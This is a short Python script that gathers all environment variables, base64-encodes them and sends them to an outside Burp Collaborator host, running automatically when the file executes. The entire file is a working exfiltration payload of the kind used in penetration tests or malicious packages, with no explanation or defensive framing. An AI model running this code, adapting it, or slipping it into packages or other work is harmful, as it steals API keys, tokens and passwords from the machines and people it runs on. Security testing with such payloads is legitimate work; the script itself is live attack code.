import os
import urllib.parse
import urllib.request
import base64

def send_data():
    # Get all environment variables
    data = dict(os.environ)

    # Combine all environment variables into a single string
    combined_data = "&".join([f"{k}={v}" for k, v in data.items()])

    # Base64 encode the combined data
    encoded_data = base64.urlsafe_b64encode(combined_data.encode()).decode()

    # Create a base URL (example URL, replace with actual URL)
    base_url = 'http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net'

    # Use the encoded data as a query parameter
    url = f"{base_url}/?data={encoded_data}"

    # Perform the request without reading the response
    request = urllib.request.Request(url)
    urllib.request.urlopen(request).close()

# Call the function
send_data()
